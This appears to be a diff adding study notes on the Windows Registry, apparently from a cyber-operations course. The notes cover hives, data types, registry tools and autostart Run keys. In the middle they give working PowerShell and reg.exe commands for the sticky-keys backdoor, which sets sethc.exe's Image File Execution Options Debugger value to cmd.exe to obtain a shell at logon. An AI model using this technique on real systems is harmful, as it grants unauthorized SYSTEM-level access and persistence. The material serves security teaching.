@@ -1,0 +1,68 @@
+Windows Registry
+----------------
+What is it?
+	- Hierachical database of critical system configuration
+	- Registry is the configuration and control mechanism for the Windows OS
+	- Contains both system-wide and per-user settings
+What is it's role?
+	- During Initial Boot Process (pre-kernel)
+		- List of boot device drivers to load before kernel
+	- During kernel boot process
+		- Loads device drivers and system element configuration
+	- During Logon
+		- Reads per-user preferences and settings
+	- During application startup and execution
+		- Licensing data, installed component, software settings/configuration
+	- Random reads and writes during application use
+
+Registry Hives:
+- A Registry Hive is a group of keys, subkeys, and values in the registry that has a set of supporting files that contain backups of its data
+- Five Types of Hives
+	- HKCU - Current User - personal account settings
+	- HKU - Users, all accounts on machine
+	- HKCR - Classes Root, file associations, backward compatibility, and file extension info
+	- HKLM - Local Machine, system related information, critical boot/kernel functions, hardware
+	- HKCC - Current Configuration - current hardware profile, info that is gathered at runtime
+
+
+***ONLY HKCU and HKLM are available via remote connections***
+
+Registry contains KEYS and VALUES:
+- KEYS contain other keys (sub-keys) and/or collection of property/value pairs. Keys are a container object, like folder
+- VALUES store data, and are non-container object, much like a file
+
+Common Data Types
+REG_SZ
+REG_LINK
+REG_BINARY
+REG_MULTI_SZ
+REG_DWORD
+REG_QWORD
+
+Registry Tools
+--------------
+- Regedit.exe - GUI based registry tool
+- REG.exe - command line tool
+- psexec -s -i regedit
+- psexec -s -i powershell
+- WMIC class stdregprov CALL <MethodName>
+- Get-Child Item HKLM
+
+Changes to the registry may require a restart to take effect.
+
+Instructions for creating a malicious shell at logon via Powershell:
+-new-item -path 'HKLM:\software\microsoft\windows nt\currentversion\image file execution options\sethc.exe'
+new-itemproperty -path 'hklm:\software\microsoft\windows nt\currentversion\image file execution options\sethc.exe\' -Name Debugger -Type string -Value "C:\Windows\System32\cmd.exe"
+- Log out, and now if you hit sticky keys (hit shift 5-10 times quickly), a CMD Shell pops up
+
+Instructions via CLI:
+reg add "HKLM\SOFTWARE\Microsoft\windows nt\currentversion\image file execution options\sethc.exe" /v Debugger /t reg_sz /d "C:\Windows\System32\cmd.exe"
+
+Forensically-relevant Registry Locations
+---------------------------------------
+HKLM\RUN - runs on every reboot
+HKLM\RUNONCE - runs on the next reboot
+HKCU\RUN or HKCU\RUNONCE - runs on that user's logon
+See slide 15 on CCTCW03 slide deck
+get
+
